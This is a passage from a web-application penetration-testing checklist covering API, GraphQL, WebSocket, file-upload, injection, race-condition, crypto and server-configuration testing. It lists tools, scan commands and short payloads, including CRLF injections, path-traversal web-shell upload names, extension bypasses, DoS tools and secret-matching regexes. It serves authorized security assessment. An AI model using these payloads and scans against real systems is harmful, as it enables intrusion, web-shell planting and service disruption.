  - **Tools**: [Burp Suite](https://portswigger.net/burp), Browser DevTools, [OWASP ZAP](https://www.zaproxy.org/)
  - **How-to**: Disable JavaScript, modify validation logic, direct API calls
  - **Testing**: Form validation bypass, business rule enforcement

- [ ] **API key exposure** in client-side code
  - **Tools**: Browser DevTools, [TruffleHog](https://github.com/trufflesecurity/truffleHog), [GitLeaks](https://github.com/zricethezav/gitleaks)
  - **How-to**: Search JavaScript files for API keys, tokens, secrets
  - **Patterns**: `/[A-Za-z0-9]{32}/`, `/sk_[a-z]{2}_[A-Za-z0-9]{24}/` (Stripe), `/AIza[A-Za-z0-9]{35}/` (Google)

- [ ] **Hardcoded credentials** in JavaScript or configuration files
  - **Tools**: Browser DevTools Sources tab, [Secret Scanner](https://github.com/Yelp/detect-secrets)
  - **How-to**: Search for passwords, usernames, connection strings
  - **Patterns**: `password`, `pwd`, `secret`, `token`, `key`

- [ ] **Source map** exposure and sensitive information leakage
  - **Tools**: Browser DevTools Sources tab, [sourcemap-toolkit](https://github.com/Microsoft/sourcemap-toolkit)
  - **How-to**: Check for `.map` files, original source code exposure
  - **Testing**: Development code exposure, comments, debugging information

- [ ] **Debug information** exposure in production builds
  - **Tools**: Browser DevTools Console, Manual inspection
  - **How-to**: Check console logs, debug statements, verbose errors
  - **Look for**: Debug logs, stack traces, internal paths

- [ ] **Third-party library** vulnerabilities and outdated dependencies
  - **Tools**: [Retire.js](https://retirejs.github.io/retire.js/), [Snyk](https://snyk.io/), [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit)
  - **How-to**: `retire --js --outputformat json`, analyze loaded libraries
  - **Check**: Version numbers, known CVEs, security advisories

### 7.3 Browser Security Features

- [ ] **Content Security Policy (CSP)** implementation and bypass
  - **Tools**: [CSP Evaluator](https://csp-evaluator.withgoogle.com/), [CSP Auditor](https://csp-auditor.org/), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Analyze CSP header, test policy effectiveness
  - **Bypass**: JSONP endpoints, unsafe-inline, nonce/hash bypasses

- [ ] **Cross-Origin Resource Sharing (CORS)** configuration
  - **Tools**: [CORStest](https://github.com/RUB-NDS/CORStest), [Burp Suite](https://portswigger.net/burp), [Corsy](https://github.com/s0md3v/Corsy)
  - **How-to**: `python3 corsy.py -u target.com` or manual Origin header testing
  - **Testing**: Wildcard origins, credential sharing, subdomain bypass

- [ ] **Referrer Policy** implementation and privacy implications
  - **Tools**: Browser DevTools Network tab, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Check Referrer-Policy header, test referrer leakage
  - **Policies**: `no-referrer`, `strict-origin-when-cross-origin`, `unsafe-url`

- [ ] **Feature Policy/Permissions Policy** implementation
  - **Tools**: Browser DevTools Console, [Feature Policy Tester](https://featurepolicy.info/)
  - **How-to**: Check Permissions-Policy header, test feature restrictions
  - **Features**: Camera, microphone, geolocation, payment, fullscreen

- [ ] **Subresource Integrity (SRI)** for external resources
  - **Tools**: [SRI Hash Generator](https://www.srihash.org/), Browser DevTools
  - **How-to**: Check integrity attributes on script/link tags
  - **Testing**: Missing SRI, incorrect hashes, CDN compromise scenarios

- [ ] **Mixed content** issues (HTTP resources over HTTPS)
  - **Tools**: Browser DevTools Security tab, [Mixed Content Scanner](https://github.com/bramus/mixed-content-scanner)
  - **How-to**: Load HTTPS page, check for HTTP resources in DevTools
  - **Types**: Active mixed content (scripts), passive mixed content (images)

- [ ] **Frame busting** and clickjacking protection
  - **Tools**: [Clickjacker](https://clickjacker.io/), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test X-Frame-Options, frame-ancestors CSP directive
  - **Bypass**: Double framing, sandbox attribute, 204 responses

## Phase 8: API Security Testing

### 8.1 REST API Security

- [ ] **HTTP method** manipulation and unauthorized methods
  - **Tools**: [Postman](https://www.postman.com/), [HTTPie](https://httpie.io/), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test OPTIONS, PUT, DELETE, PATCH methods on all endpoints
  - **Testing**: `curl -X OPTIONS target.com/api/users`, method override headers

- [ ] **Parameter pollution** and duplicate parameter handling
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Arjun](https://github.com/s0md3v/Arjun), [ParamPollute](https://github.com/0xInfection/ParamPollute)
  - **How-to**: Send duplicate parameters with different values
  - **Examples**: `?id=1&id=2`, `{"user":"admin","user":"guest"}`

- [ ] **Rate limiting** implementation and bypass techniques
  - **Tools**: [Burp Suite Intruder](https://portswigger.net/burp), [FFuF](https://github.com/ffuf/ffuf), [Rate-Limit-Bypass](https://github.com/ayamshehada/Rate-Limit-Bypass)
  - **How-to**: Send rapid requests, test different IP sources
  - **Bypass**: X-Forwarded-For, X-Real-IP, rotating User-Agents

- [ ] **API versioning** security and deprecated version access
  - **Tools**: [Postman](https://www.postman.com/), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test different API versions (/v1/, /v2/, /api/v1/)
  - **Testing**: Deprecated endpoints, version downgrade attacks

- [ ] **Error handling** and information disclosure in responses
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Send malformed requests, invalid parameters
  - **Analysis**: Stack traces, database errors, internal paths

- [ ] **Data validation** and input sanitization
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [API Security Testing](https://github.com/arainho/awesome-api-security)
  - **How-to**: Test input validation on all API endpoints
  - **Testing**: SQL injection, XSS, command injection in API parameters

- [ ] **Response manipulation** and data integrity
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [mitmproxy](https://mitmproxy.org/)
  - **How-to**: Intercept and modify API responses
  - **Testing**: Client-side validation reliance, response tampering

### 8.2 GraphQL Security (if applicable)

- [ ] **Query complexity** analysis and DoS prevention
  - **Tools**: [GraphQL Playground](https://github.com/graphql/graphql-playground), [Burp Suite](https://portswigger.net/burp), [InQL](https://github.com/doyensec/inql)
  - **How-to**: Submit deeply nested or recursive queries
  - **Attack**: `query { users { posts { comments { replies { ... } } } } }`

- [ ] **Introspection** query exposure and information leakage
  - **Tools**: [GraphQL Voyager](https://github.com/APIs-guru/graphql-voyager), [GraphiQL](https://github.com/graphql/graphiql)
  - **How-to**: Send introspection queries to map schema
  - **Query**: `query IntrospectionQuery { __schema { queryType { name } } }`

- [ ] **Mutation** authorization and data manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [GraphQL IDE](https://github.com/redound/graphql-ide)
  - **How-to**: Test mutation access without proper authorization
  - **Testing**: IDOR in mutations, privilege escalation

- [ ] **Subscription** security and real-time data exposure
  - **Tools**: [GraphQL Playground](https://github.com/graphql/graphql-playground), WebSocket tools
  - **How-to**: Test subscription authorization, data filtering
  - **Testing**: Unauthorized subscriptions, information leakage

- [ ] **Schema** security and type validation
  - **Tools**: [GraphQL Inspector](https://github.com/kamilkisiela/graphql-inspector), Manual analysis
  - **How-to**: Analyze schema for security issues
  - **Issues**: Overly permissive types, sensitive field exposure

- [ ] **Resolver** security and injection vulnerabilities
  - **Tools**: [Burp Suite](https://portswigger.net/burp), GraphQL-specific scanners
  - **How-to**: Test resolver functions for injection flaws
  - **Testing**: SQL injection in resolvers, NoSQL injection

- [ ] **Batching attack** prevention and query limits
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Custom scripts
  - **How-to**: Send multiple queries in single request
  - **Attack**: `[{"query": "query1"}, {"query": "query2"}, ...]`

### 8.3 WebSocket Security (if applicable)

- [ ] **Connection hijacking** and unauthorized access
  - **Tools**: [WebSocket King](https://websocketking.com/), [Burp Suite](https://portswigger.net/burp), [wscat](https://github.com/websockets/wscat)
  - **How-to**: Test WebSocket connection without proper authentication
  - **Testing**: Session fixation, connection takeover

- [ ] **Message tampering** and data integrity
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [WebSocket Proxy](https://github.com/nccgroup/websocket-fuzzer)
  - **How-to**: Intercept and modify WebSocket messages
  - **Testing**: Message modification, replay attacks

- [ ] **Cross-Site WebSocket Hijacking (CSWSH)**
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Custom HTML pages
  - **How-to**: Create malicious page that connects to WebSocket
  - **Testing**: Origin validation, CSRF token requirements

- [ ] **Origin validation** and CORS-like protections
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Browser DevTools
  - **How-to**: Test Origin header validation in WebSocket handshake
  - **Bypass**: Missing validation, wildcard origins

- [ ] **Authentication** and authorization for WebSocket connections
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [wscat](https://github.com/websockets/wscat)
  - **How-to**: Test authentication requirements for WebSocket connections
  - **Testing**: Token validation, session management

- [ ] **Rate limiting** for WebSocket messages
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Custom scripts
  - **How-to**: Send rapid WebSocket messages
  - **Testing**: Message flooding, DoS protection

- [ ] **Data validation** for WebSocket payloads
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [WebSocket Fuzzer](https://github.com/nccgroup/websocket-fuzzer)
  - **How-to**: Send malformed payloads via WebSocket
  - **Testing**: JSON injection, XSS, command injection

## Phase 9: File Upload & Processing Security

### 9.1 File Upload Security

- [ ] **File type validation** bypass using MIME type manipulation
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Upload Scanner](https://github.com/modzero/mod0BurpUploadScanner), [Fuxploider](https://github.com/almandin/fuxploider)
  - **How-to**: Modify Content-Type header, use file signature mismatch
  - **Bypass**: `Content-Type: image/jpeg` for PHP files, polyglot files

- [ ] **File extension** filtering bypass and double extensions
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [FileUpload-Vulnerabilities](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
  - **How-to**: Test various extensions, case sensitivity, null bytes
  - **Bypass**: `.php.jpg`, `.php5`, `.phtml`, `.php%00.jpg`

- [ ] **File size** validation and denial of service through large files
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Large file generators
  - **How-to**: Upload extremely large files, test size limits
  - **Testing**: Disk space exhaustion, memory consumption

- [ ] **Malicious file upload** (web shells, executable files)
  - **Tools**: [Weevely](https://github.com/epinna/weevely3), [China Chopper](https://github.com/L-codes/Weevely), [Web Shell Collection](https://github.com/tennc/webshell)
  - **How-to**: Upload web shells disguised as legitimate files
  - **Shells**: PHP, ASP, JSP web shells with various encoding techniques

- [ ] **Path traversal** in file upload location
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Manipulate filename to write outside upload directory
  - **Payloads**: `../../../var/www/html/shell.php`, `..\\..\\..\\shell.php`

- [ ] **File overwrite** vulnerabilities and existing file replacement
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Upload files with names of existing critical files
  - **Targets**: `index.php`, `config.php`, `.htaccess`, `web.config`

- [ ] **Virus/malware** scanning implementation
  - **Tools**: [EICAR test file](https://www.eicar.org/), [ClamAV](https://www.clamav.net/)
  - **How-to**: Upload EICAR test file, actual malware samples (in controlled environment)
  - **Testing**: Scanner bypass techniques, delayed scanning

### 9.2 File Processing Security

- [ ] **Image processing** vulnerabilities (ImageMagick, etc.)
  - **Tools**: [ImageTragick](https://imagetragick.com/), [ImageMagick Exploits](https://github.com/neex/exploits)
  - **How-to**: Upload specially crafted images with embedded payloads
  - **Payloads**: MVG files with shell commands, SVG with XXE

- [ ] **Document processing** vulnerabilities (PDF, Office documents)
  - **Tools**: [Malicious Document Generator](https://github.com/ryhanson/phishery), [MSF Office Modules](https://www.metasploit.com/)
  - **How-to**: Create malicious documents with embedded payloads
  - **Attacks**: Macro-enabled documents, PDF JavaScript, XXE in docx

- [ ] **Archive extraction** vulnerabilities (zip bombs, path traversal)
  - **Tools**: [Zip Bomb generators](https://www.bamsoftware.com/hacks/zipbomb/), [Archive extraction tools](https://github.com/ptoomey3/evilarc)
  - **How-to**: Create zip bombs, archives with path traversal
  - **Attacks**: `42.zip` (zip bomb), `../../../etc/passwd` in archive

- [ ] **Metadata extraction** and privacy implications
  - **Tools**: [ExifTool](https://exiftool.org/), [FOCA](https://github.com/ElevenPaths/FOCA), [Metagoofil](https://github.com/laramies/metagoofil)
  - **How-to**: Analyze uploaded files for metadata
  - **Data**: GPS coordinates, camera info, author names, software versions

- [ ] **File parsing** vulnerabilities in custom parsers
  - **Tools**: [File Format Fuzzers](https://github.com/IOActive/FuzzLabs), [AFL](https://lcamtuf.coredump.cx/afl/)
  - **How-to**: Test custom file parsers with malformed files
  - **Testing**: Buffer overflows, format string bugs, parser confusion

- [ ] **Content validation** and malicious content detection
  - **Tools**: [YARA](https://virustotal.github.io/yara/), [ClamAV](https://www.clamav.net/), Custom validators
  - **How-to**: Test content scanning effectiveness
  - **Bypass**: Encoding, encryption, steganography

- [ ] **File storage** security and access control
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test direct file access, storage permissions
  - **Testing**: Public file access, predictable file paths, directory listing

## Phase 10: Advanced Attack Vectors

### 10.1 Advanced Injection Attacks

- [ ] **HTTP Request Smuggling** (CL.TE, TE.CL, TE.TE)
  - **Tools**: [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler), [Smuggler.py](https://github.com/defparam/smuggler)
  - **How-to**: `python3 smuggler.py -u target.com`, test different payload combinations
  - **Techniques**: Content-Length vs Transfer-Encoding conflicts

- [ ] **HTTP Response Splitting** and header injection
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Inject CRLF characters in user input reflected in headers
  - **Payloads**: `%0d%0aSet-Cookie: admin=true`, `\r\n\r\n<script>alert('XSS')</script>`

- [ ] **CRLF Injection** in headers and responses
  - **Tools**: [CRLFsuite](https://github.com/Naughty-Hacks/CRLFsuite), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Test CRLF injection in various input points
  - **Payloads**: `%0A%0D`, `\r\n`, URL-encoded line breaks

- [ ] **Host Header Injection** and virtual host confusion
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Host Header Attack](https://github.com/gwen001/host-header-attack)
  - **How-to**: Modify Host header, test password reset poisoning
  - **Attacks**: Cache poisoning, password reset poisoning, virtual host confusion

- [ ] **Parameter pollution** in HTTP parameters
  - **Tools**: [ParamPollute](https://github.com/0xInfection/ParamPollute), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Send duplicate parameters with different values
  - **Testing**: Backend interpretation differences, WAF bypass

- [ ] **HTTP Parameter Pollution (HPP)** across different layers
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Manual testing
  - **How-to**: Test parameter handling across web server, application, backend
  - **Scenarios**: Load balancer vs application interpretation

- [ ] **Cache poisoning** through HTTP header manipulation
  - **Tools**: [Web Cache Deception Scanner](https://github.com/Hackmanit/Web-Cache-Deception-Scanner), [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Manipulate cache keys, test cache behavior
  - **Techniques**: Cache deception, cache poisoning, cache key confusion

### 10.2 Timing and Race Condition Attacks

- [ ] **Race condition** in critical operations (payments, etc.)
  - **Tools**: [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder), [Race the Web](https://github.com/insp3ctre/race-the-web)
  - **How-to**: Send concurrent requests to exploit race conditions
  - **Scenarios**: Double spending, coupon reuse, privilege escalation

- [ ] **Time-of-check vs time-of-use (TOCTOU)** attacks
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Timing analysis tools
  - **How-to**: Exploit timing gaps between validation and usage
  - **Examples**: File permission checks, resource validation

- [ ] **Timing attacks** for information disclosure
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Statistical analysis tools
  - **How-to**: Measure response times for user enumeration, validation bypass
  - **Analysis**: Response time differences, statistical significance

- [ ] **Concurrent request** handling and data consistency
  - **Tools**: [Apache Bench](https://httpd.apache.org/docs/2.4/programs/ab.html), [wrk](https://github.com/wg/wrk), [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
  - **How-to**: Send multiple concurrent requests
  - **Testing**: Data corruption, inconsistent state

- [ ] **Resource exhaustion** through concurrent requests
  - **Tools**: [LOIC](https://github.com/NewEraCracker/LOIC), [Slowloris](https://github.com/gkbrk/slowloris), [Apache Bench](https://httpd.apache.org/docs/2.4/programs/ab.html)
  - **How-to**: `ab -n 1000 -c 100 target.com/`, resource-intensive endpoints
  - **Testing**: Connection exhaustion, memory consumption, CPU usage

- [ ] **Deadlock** conditions in database operations
  - **Tools**: Database monitoring tools, [Burp Suite](https://portswigger.net/burp)
  - **How-to**: Trigger deadlocks through concurrent operations
  - **Testing**: Database locking, transaction conflicts

- [ ] **Asynchronous operation** security and state management
  - **Tools**: [Burp Suite](https://portswigger.net/burp), Async testing frameworks
  - **How-to**: Test async operation completion, state consistency
  - **Issues**: Incomplete operations, state corruption

### 10.3 Cryptographic Implementation Testing

- [ ] **Weak random number generation** and predictable tokens
  - **Tools**: [Burp Suite Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer), [ENT](https://www.fourmilab.ch/random/)
  - **How-to**: Collect multiple tokens, analyze randomness quality
  - **Analysis**: Entropy measurement, pattern detection

- [ ] **Crypto algorithm** implementation weaknesses
  - **Tools**: [Cryptographic testing tools](https://github.com/GiSec/Cryptanalyzer), Manual analysis
  - **How-to**: Test crypto algorithm choices, implementation flaws
  - **Issues**: Weak algorithms (MD5, SHA1), poor implementations

- [ ] **Key management** security and key exposure
  - **Tools**: [TruffleHog](https://github.com/trufflesecurity/truffleHog), [KeyHacks](https://github.com/streaak/keyhacks)
  - **How-to**: Search for exposed keys in code, configuration
  - **Testing**: Key rotation, access controls, key storage

- [ ] **Hash function** security and collision resistance
  - **Tools**: [HashCat](https://hashcat.net/hashcat/), [JohnTheRipper](https://github.com/openwall/john)
  - **How-to**: Test hash strength, collision attacks
  - **Analysis**: Hash algorithm choice, salt usage, iteration count

- [ ] **Digital signature** validation and replay attacks
  - **Tools**: [OpenSSL](https://www.openssl.org/), Cryptographic libraries
  - **How-to**: Test signature validation, replay prevention
  - **Testing**: Signature verification bypass, timestamp validation

- [ ] **Encryption** implementation and mode of operation security
  - **Tools**: [PyCrypto](https://pypi.org/project/pycrypto/), [Cryptographic analysis tools](https://github.com/GiSec/Cryptanalyzer)
  - **How-to**: Test encryption modes, padding attacks
  - **Issues**: ECB mode, padding oracle attacks, IV reuse

- [ ] **Side-channel attacks** resistance in cryptographic operations
  - **Tools**: Timing analysis tools, Power analysis (if applicable)
  - **How-to**: Measure timing differences in crypto operations
  - **Analysis**: Timing attacks, cache attacks, power analysis

## Phase 11: Infrastructure & Hosting Security

### 11.1 Cloud Security Assessment

- [ ] **Cloud storage** misconfiguration (S3 buckets, etc.)
  - **Tools**: [CloudBrute](https://github.com/0xsha/CloudBrute), [S3Scanner](https://github.com/sa7mon/S3Scanner), [CloudScraper](https://github.com/jordanpotti/CloudScraper)
  - **How-to**: `python3 s3scanner.py sites.txt`, enumerate cloud storage
  - **Testing**: Public read/write access, subdomain takeover

- [ ] **Container security** and Docker/Kubernetes misconfigurations
  - **Tools**: [Docker Bench](https://github.com/docker/docker-bench-security), [kube-score](https://github.com/zegl/kube-score), [Falco](https://falco.org/)
  - **How-to**: Scan container configurations, runtime security
  - **Issues**: Privileged containers, exposed ports, insecure defaults

- [ ] **Serverless** function security and execution context
  - **Tools**: [ServerlessGoat](https://github.com/OWASP/Serverless-Goat), [Sentry](https://sentry.io/), [PureSec](https://www.puresec.io/)
  - **How-to**: Test function permissions, input validation, resource limits
  - **Issues**: Over-privileged functions, injection attacks, DoS

- [ ] **CDN** configuration and cache poisoning vulnerabilities
  - **Tools**: [CDN Planet](https://www.cdnplanet.com/tools/), [Web Cache Deception Scanner](https://github.com/Hackmanit/Web-Cache-Deception-Scanner)
  - **How-to**: Test CDN caching behavior, origin server bypass
  - **Testing**: Cache poisoning, origin IP disclosure, bypass techniques

- [ ] **Load balancer** configuration and security
  - **Tools**: [Burp Suite](https://portswigger.net/burp), [Nmap](https://nmap.org/), Network analysis
  - **How-to**: Test load balancing algorithms, session persistence
  - **Issues**: Session fixation, uneven distribution, backend exposure

- [ ] **Auto-scaling** security and resource abuse
  - **Tools**: Load testing tools, [Apache Bench](https://httpd.apache.org/docs/2.4/programs/ab.html)
  - **How-to**: Trigger auto-scaling, test resource limits
  - **Testing**: Resource exhaustion, cost amplification attacks

- [ ] **Cloud IAM** configuration and overprivileged access
  - **Tools**: [Scout Suite](https://github.com/nccgroup/ScoutSuite), [Prowler](https://github.com/toniblyx/prowler), [CloudMapper](https://github.com/duo-labs/cloudmapper)
  - **How-to**: Audit cloud permissions, role assignments
  - **Issues**: Overprivileged roles, public access, credential exposure

### 11.2 Server Configuration Security

- [ ] **Web server** security configuration and hardening
  - **Tools**: [Nikto](https://github.com/sullo/nikto), [Nmap](https://nmap.org/), [testssl.sh](https://testssl.sh/), [httprint](https://github.com/urbanadventurer/WhatWeb)
  - **How-to**: `nikto -h target.com -Cgidirs all -maxtime 120s`, `nmap --script http-methods,http-trace target.com`
  - **Advanced**: `./testssl.sh --protocols --server-defaults target.com:443`
  - **Check**: Server version disclosure, dangerous HTTP methods (PUT, DELETE, TRACE), security headers
  - **Configuration**: Directory listing, default pages, error handling, file permissions
  - **Hardening**: Remove server banners, disable unnecessary modules, configure secure defaults

- [ ] **Application server** security and configuration review
  - **Tools**: [Tomcat Scanner](https://github.com/mgeeky/tomcatWarDeployer), [JexBoss](https://github.com/joaomatosf/jexboss), [WebLogic Scanner](https://github.com/0xn0ne/weblogicScanner)
  - **Tomcat**: `python tomcatWarDeployer.py -U http://target.com -P 8080 -v`
  - **JBoss/WildFly**: `python jexboss.py -u http://target.com:8080`
  - **WebLogic**: `python weblogicScanner.py -t target.com:7001`
  - **IIS**: `nmap --script http-iis-webdav-vuln,http-iis-short-name-brute target.com`
  - **Testing**: Default credentials (admin/admin, tomcat/tomcat), exposed management interfaces (/manager, /console)
  - **Config files**: web.xml, server.xml, application.xml misconfigurations
  - **Vulnerabilities**: CVE-specific exploits, deserialization flaws, path traversal

- [ ] **Database server** security and access control
  - **Tools**: [SQLMap](https://github.com/sqlmapproject/sqlmap), [NoSQLMap](https://github.com/codingo/NoSQLMap), [MySQLTuner](https://github.com/major/MySQLTuner-perl), [MongoDB Security Checker](https://github.com/stamparm/DSSS)
  - **MySQL**: `nmap --script mysql-audit,mysql-databases,mysql-dump-hashes target.com -p 3306`
  - **PostgreSQL**: `nmap --script pgsql-brute,pgsql-databases target.com -p 5432`
  - **MongoDB**: `python dsss.py -u mongodb://target.com:27017`
  - **MSSQL**: `nmap --script ms-sql-info,ms-sql-brute target.com -p 1433`
  - **Oracle**: `nmap --script oracle-sid-brute,oracle-brute target.com -p 1521`
  - **Issues**: Default credentials, public access, weak authentication, unencrypted connections
  - **Configuration**: Access controls, user privileges, network bindings, SSL/TLS encryption
  - **Auditing**: Query logging, access monitoring, privilege escalation detection

- [ ] **Operating system** security and patch management
  - **Tools**: [Nessus](https://www.tenable.com/products/nessus), [OpenVAS](https://www.openvas.org/), [Lynis](https://github.com/CISOfy/lynis), [Linux-Exploit-Suggester](https://github.com/mzet-/linux-exploit-suggester)
  - **Linux**: `./lynis audit system --profile /etc/lynis/default.prf`, `./linux-exploit-suggester.sh`
  - **Windows**: `nmap --script smb-vuln-* target.com`, vulnerability scanners
  - **Package management**: `apt list --upgradable` (Debian/Ubuntu), `yum check-update` (RHEL/CentOS)
  - **Kernel**: `uname -r`, check for known kernel exploits and privilege escalation vectors
  - **Services**: `systemctl list-units --type=service --state=running` (systemd), `netstat -tulnp`
  - **Check**: Missing patches, outdated software, insecure configurations, unnecessary services
  - **Hardening**: Disable unused services, configure firewalls, implement access controls, security updates

- [ ] **Network configuration** and firewall rules
  - **Tools**: [Nmap](https://nmap.org/), [Firewalk](http://packetfactory.openwall.net/projects/firewalk/), [FTester](http://www.inversepath.com/ftester.html), [hping3](https://github.com/antirez/hping)
  - **Port scanning**: `nmap -sS -O target.com`, test firewall effectiveness
  - **Firewall testing**: `firewalk -S 1-1000 -p tcp gateway target.com`
  - **ACL testing**: `hping3 -S -p 80 -c 1 target.com` (test specific rules)
  - **Network discovery**: `nmap -sn 192.168.1.0/24` (ping sweep)
  - **Route analysis**: `traceroute target.com`, `mtr target.com`
  - **Testing**: Port filtering, network segmentation, rule bypasses, default deny policies
  - **Configuration**: Ingress/egress filtering, logging, fail-secure defaults

- [ ] **Service configuration** and unnecessary service exposure
  - **Tools**: [Nmap](https://nmap.org/), [Netstat](https://linux.die.net/man/8/netstat), [SS](https://linux.die.net/man/8/ss), Service-specific scanners
  - **Service discovery**: `nmap -sV target.com`, identify running services and versions
  - **Local services**: `netstat -tulnp` or `ss -tulnp` (show listening ports and processes)
  - **Service enumeration**: `nmap --script *-info target.com` (gather service information)
  - **Banner grabbing**: `nc target.com 22`, `telnet target.com 25`
  - **Common services**: SSH (22), FTP (21), Telnet (23), SMTP (25), DNS (53), HTTP (80), HTTPS (443)
  - **Analysis**: Unnecessary services, default configurations, service hardening, version disclosure
  - **Hardening**: Disable unused services, change default ports, configure service-specific security

- [ ] **Backup and recovery** security and data protection
  - **Tools**: [Gobuster](https://github.com/OJ/gobuster), [Burp Suite](https://portswigger.net/burp), [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project), Manual testing
  - **Backup discovery**: `gobuster dir -u target.com -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt`
  - **Common paths**: `/backup/`, `/backups/`, `/db_backup/`, `/sql/`, `/dumps/`
  - **File extensions**: `.bak`, `.backup`, `.old`, `.orig`, `.sql`, `.tar.gz`, `.zip`
  - **Database dumps**: `target.com/database.sql`, `target.com/backup.sql`, `target.com/dump.sql`
  - **Configuration backups**: `web.config.bak`, `.htaccess.old`, `config.php.backup`
  - **Testing**: Backup file exposure, encryption, access controls, automated discovery
  - **Security**: Encrypted backups, secure storage, access logging, retention policies
  - **Recovery**: Test restore procedures, data integrity verification, disaster recovery plans

- [ ] **Log management** and security monitoring configuration
  - **Tools**: [Logrotate](https://linux.die.net/man/8/logrotate), [Rsyslog](https://www.rsyslog.com/), [ELK Stack](https://www.elastic.co/elastic-stack/), [Splunk](https://www.splunk.com/)
  - **Log locations**: `/var/log/`, `/var/log/apache2/`, `/var/log/nginx/`, Windows Event Logs
  - **Web server logs**: Access logs, error logs, security logs analysis
  - **System logs**: `/var/log/auth.log`, `/var/log/syslog`, `/var/log/secure`
  - **Application logs**: Custom application logging, database logs, authentication logs
  - **Configuration**: Log rotation, retention policies, remote logging, log integrity
  - **Analysis**: Failed login attempts, privilege escalation, suspicious activities
  - **Security**: Log tampering protection, centralized logging, real-time monitoring

- [ ] **File system** permissions and access controls
  - **Tools**: [Find](https://linux.die.net/man/1/find), [Stat](https://linux.die.net/man/1/stat), [ACL tools](https://linux.die.net/man/1/getfacl), Permission analyzers
  - **Permission audit**: `find / -type f -perm -4000 2>/dev/null` (SUID files)
  - **World-writable**: `find / -perm -002 -type f 2>/dev/null`
  - **No owner**: `find / -nouser -o -nogroup 2>/dev/null`
  - **Configuration files**: Check permissions on sensitive files (passwords, keys, configs)
  - **Web directories**: Ensure proper permissions on web root, upload directories
  - **Temporary files**: `/tmp`, `/var/tmp` permissions and sticky bit configuration
  - **Home directories**: User home directory permissions, SSH key files
  - **System files**: Critical system file permissions, immutable attributes

- [ ] **SSL/TLS certificate** and cryptographic configuration
  - **Tools**: [OpenSSL](https://www.openssl.org/), [testssl.sh](https://testssl.sh/), [SSLyze](https://github.com/nabla-c0d3/sslyze), [SSL Labs](https://www.ssllabs.com/)
  - **Certificate analysis**: `openssl x509 -in cert.pem -text -noout`
  - **Chain validation**: `openssl verify -CAfile ca-bundle.crt server.crt`
  - **Cipher testing**: `nmap --script ssl-enum-ciphers target.com -p 443`
  - **Protocol testing**: `./testssl.sh --protocols target.com`
  - **Certificate transparency**: Check CT logs for certificate monitoring
  - **Configuration**: Strong cipher suites, perfect forward secrecy, HSTS implementation
  - **Management**: Certificate expiration monitoring, automated renewal, key rotation

- [ ] **Security policy** implementation and enforcement
  - **Tools**: [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/) (Windows), [SELinux](https://github.com/SELinuxProject/selinux), [AppArmor](https://gitlab.com/apparmor/apparmor)
  - **Password policies**: Complexity requirements, expiration, history, lockout policies
  - **Access control**: User account policies, privilege separation, least privilege principle
  - **Audit policies**: Security event logging, audit trail configuration
  - **Network policies**: Firewall rules, network segmentation, VPN configuration
  - **Application policies**: Software restriction policies, application whitelisting
  - **Compliance**: Regulatory requirements (PCI DSS, HIPAA, SOX), industry standards
  - **Enforcement**: Policy monitoring, violation detection, automated remediation
